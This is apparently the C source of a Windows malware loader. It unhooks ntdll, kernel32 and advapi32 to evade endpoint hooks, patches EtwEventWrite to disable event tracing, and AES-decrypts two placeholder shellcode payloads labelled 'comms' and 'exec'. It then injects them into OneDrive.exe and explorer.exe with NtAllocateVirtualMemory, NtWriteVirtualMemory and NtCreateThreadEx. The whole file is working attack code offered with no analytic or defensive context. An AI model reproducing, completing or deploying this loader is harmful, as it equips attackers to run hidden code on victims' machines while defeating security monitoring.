#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <winnt.h>
#include <ntstatus.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
#endif
#ifndef OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#endif
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define PROCESS_CREATE_THREAD 0x0002
#define PROCESS_QUERY_INFORMATION 0x0400
#define PROCESS_VM_OPERATION 0x0008
#define PROCESS_VM_READ 0x0010
#define PROCESS_VM_WRITE 0x0020



// comms shellcode - 64-bit
unsigned char comms_payload[] = { encrypted_communication_program_shellcode_here }
unsigned char comms_key[] = { AES_decrytion_key_here };
unsigned int comms_payload_len = sizeof(comms_payload);
// exec shellcode - 64-bit
unsigned char exec_payload[] = { encrypted_execution_program_shellcode_here }
unsigned char exec_key[] = { AES_decrytion_key_here };
unsigned int exec_payload_len = sizeof(exec_payload);


typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtAllocateVirtualMemory_t)(
  HANDLE ProcessHandle,
  PVOID *BaseAddress,
  ULONG_PTR ZeroBits,
  PSIZE_T RegionSize,
  ULONG AllocationType,
  ULONG Protect);

typedef NTSTATUS (NTAPI * NtWriteVirtualMemory_t)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID*           BaseAddress,
    IN OUT PSIZE_T          RegionSize,
    IN ULONG                NewProtect,
    OUT PULONG              OldProtect);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI * NtWaitForSingleObject_t)(
    HANDLE ObjectHandle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef NTSTATUS(NTAPI * NtClose_t)(HANDLE);
typedef NTSTATUS(NTAPI * NtOpenProcess_t)(
	OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK AccessMask,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI * NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
#define SystemProcessInformation 5
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)


typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);

unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sAdvapi32[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0x0 };

int CheckETW(void) {
	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandle((LPCSTR) "ntdll"), (LPCSTR) "NtProtectVirtualMemory");
	
	unsigned char sEtwEventWrite[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0x0 };
	
	void* pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)sEtwEventWrite);
	if (pEventWrite == NULL) {
		//printf("Failed to get address of EtwEventWrite. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	MEMORY_BASIC_INFORMATION mbi;
	if (!VirtualQuery(pEventWrite, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
		//printf("VirtualQuery failed. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	NTSTATUS status = NtProtectVirtualMemory_p(GetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), PAGE_EXECUTE_READWRITE, &oldprotect);
	if (status != STATUS_SUCCESS) {
		//printf("Failed to change memory protection. Error: 0x%08x\n", status);
		return -1;
	}

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif

	status = NtProtectVirtualMemory_p(GetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), oldprotect, &oldprotect);
	if (status != STATUS_SUCCESS) {
		//printf("Failed to restore memory protection. Error: 0x%08x\n", status);
		return -1;
	}

	FlushInstructionCache(GetCurrentProcess(), pEventWrite, mbi.RegionSize);
	return 0;
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


DWORD findProcID(const wchar_t* procName)
{
  NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtQuerySystemInformation");


  PSYSTEM_PROCESS_INFO spi = NULL;
  ULONG ReturnLength = 0;

  NTSTATUS status = pNtQuerySystemInformation(
    SystemProcessInformation,
    NULL,
    0,
    &ReturnLength
  );

  if (status != STATUS_INFO_LENGTH_MISMATCH) {
    return 0;
  }

  spi = (PSYSTEM_PROCESS_INFO)malloc(ReturnLength);

  status = pNtQuerySystemInformation(
    SystemProcessInformation,
    spi,
    ReturnLength,
    &ReturnLength
  );

  if (status != 0) {
    return 0;
  }

  PSYSTEM_PROCESS_INFO current = spi;
  do {
    if (current->ImageName.Buffer && wcscmp(procName, current->ImageName.Buffer) == 0) {
      DWORD pid = (DWORD)current->ProcessId;
      free(spi);
      return pid;
    }

    current = (PSYSTEM_PROCESS_INFO)((PUCHAR)current + current->NextEntryOffset);
  } while (current->NextEntryOffset != 0);

  free(spi);
  return 0;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {

	HANDLE hThread = NULL;
	CLIENT_ID cid;

    PVOID pAddress = NULL;
    SIZE_T item_length = static_cast<SIZE_T>(payload_len);

    ULONG bytesWritten = 0;


	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThreadEx");
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtWriteVirtualMemory");
    NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtProtectVirtualMemory");
    NtWaitForSingleObject_t pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtWaitForSingleObject");
    NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtClose");


    // Check function pointers
    if (pRtlCreateUserThread == NULL || pNtAllocateVirtualMemory == NULL || pNtWriteVirtualMemory == NULL || pNtCreateThreadEx == NULL || pNtProtectVirtualMemory == NULL || pNtWaitForSingleObject == NULL) {
		//printf("NTfunction resolution failed");
        return -1;
    }

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, key, keylen);
	
    NTSTATUS status = pNtAllocateVirtualMemory(hProc, &pAddress, 0, &item_length, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
		//printf("ntalloc failed");
        return -1;
    }

    // Check if item_length exceeds the maximum value of ULONG.
    if (item_length > ULONG_MAX) {
		//printf("item_length exceeds ULONG_MAX");
        return -1;
    }

    ULONG bytesToWrite = static_cast<ULONG>(item_length);
    NTSTATUS status2 = pNtWriteVirtualMemory(hProc, pAddress, (PVOID) payload, bytesToWrite, &bytesWritten);
    if (!NT_SUCCESS(status2)) {
		//printf("ntwritememory failed");
        return -1;
    }

    ULONG oldProtect;
    status = pNtProtectVirtualMemory(hProc, &pAddress, &item_length, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {
    //printf("pNtProtectVirtualMemory failed\n");
    return -1;
}

    LARGE_INTEGER timeout;
    timeout.QuadPart = -500 * 10000; // Convert milliseconds to 100-nanosecond intervals

	//pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pAddress, 0, &hThread, &cid);
	pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hThread != NULL) {
			NTSTATUS status = pNtWaitForSingleObject(hThread, FALSE, &timeout);
			if (!NT_SUCCESS(status)) {
    			//printf("pNtWaitForSingleObject failed\n");
        		return -1;
    		}			
			NTSTATUS result = pNtClose(hThread);
    		if (!NT_SUCCESS(result)) {
    			//printf("pNtClose failed\n");
        		return -1;
    		}
			return 0;
	}
	return -1;
}

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
	int i;
	
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) "ntdll"), (LPCSTR) "NtProtectVirtualMemory");
	
	SIZE_T size;
	PVOID addr;
	NTSTATUS status;
	
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
			addr = (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress);
			size = pImgSectionHead->Misc.VirtualSize;
			status = NtProtectVirtualMemory_p(GetCurrentProcess(), &addr, &size, PAGE_EXECUTE_READWRITE, &oldprotect);
			
			if (!NT_SUCCESS(status)) {
				//printf("NTVirtProtect part 1 in Unhook failed");
				return -1;
			}

			memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
				   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
				   pImgSectionHead->Misc.VirtualSize);

			status = NtProtectVirtualMemory_p(GetCurrentProcess(), &addr, &size, oldprotect, &oldprotect);

			if (!NT_SUCCESS(status)) {
				//printf("NTVirtProtect part 2 in Unhook failed");
				return -1;
			}

			return 0;
		}
	}

	return -1;
}

int MapandUnhook(LPCSTR filepath, LPCSTR moduleName) {

	int ret = 0;
	HANDLE hFile; 
	HANDLE hFileMapping;
	LPVOID pMapping;
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
    NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtClose");

	
	//Need to make pointer for CreateFile

	hFile = CreateFile((LPCSTR) filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			return -1;
	}
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) {
			pNtClose(hFile);
			return -1;
	}
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
					pNtClose(hFileMapping);
					pNtClose(hFile);
					return -1;
	}
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) moduleName), pMapping);
	UnmapViewOfFile_p(pMapping);
	pNtClose(hFileMapping);
	pNtClose(hFile);
	return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
//int main(void) {
    
    NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtClose");
	NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtOpenProcess");


	MapandUnhook("c:\\windows\\system32\\ntdll.dll",(LPCSTR) sNtdll);
	MapandUnhook("c:\\windows\\system32\\kernel32.dll",(LPCSTR) sKernel32);
	MapandUnhook("c:\\windows\\system32\\advapi32.dll",(LPCSTR) sAdvapi32);

	CheckETW();

	int pid_1 = 0;
	int pid_2 = 0;
    HANDLE hProc = NULL;
	pid_1 = findProcID(L"OneDrive.exe");
	printf("OneDrive.exe PID = %d\n", pid_1);

	pid_2 = findProcID(L"explorer.exe");
	printf("explorer.exe PID = %d\n", pid_2);

	if (pid_1) {

		OBJECT_ATTRIBUTES objAttr;
    	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    	CLIENT_ID clientId;
    	clientId.UniqueProcess = (PVOID)pid_1;
    	clientId.UniqueThread = 0;

	    NTSTATUS status = pNtOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                                    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                                    &objAttr, &clientId);
    	if (!NT_SUCCESS(status))
    	{
        	// handle error
        	return 1;
    	}

		if (hProc != NULL) {
			//printf("length of pl = %d\n", payload_len);
			Inject(hProc, comms_payload, comms_payload_len, (char *) comms_key, sizeof(comms_key));
			NTSTATUS result = pNtClose(hProc);
    		if (!NT_SUCCESS(result)) {
    			//printf("pNtClose failed\n");
        		return -1;
    		}
		}
	}
	
		if (pid_2) {

		OBJECT_ATTRIBUTES objAttr;
    	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    	CLIENT_ID clientId;
    	clientId.UniqueProcess = (PVOID)pid_2;
    	clientId.UniqueThread = 0;

	    NTSTATUS status = pNtOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                                    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                                    &objAttr, &clientId);
    	if (!NT_SUCCESS(status))
    	{
        	// handle error
        	return 1;
    	}

		if (hProc != NULL) {
			//printf("length of pl = %d\n", payload_len);
			Inject(hProc, exec_payload, exec_payload_len, (char *) exec_key, sizeof(exec_key));
			NTSTATUS result = pNtClose(hProc);
    		if (!NT_SUCCESS(result)) {
    			//printf("pNtClose failed\n");
        		return -1;
    		}
		}
	}
	return 0;
}
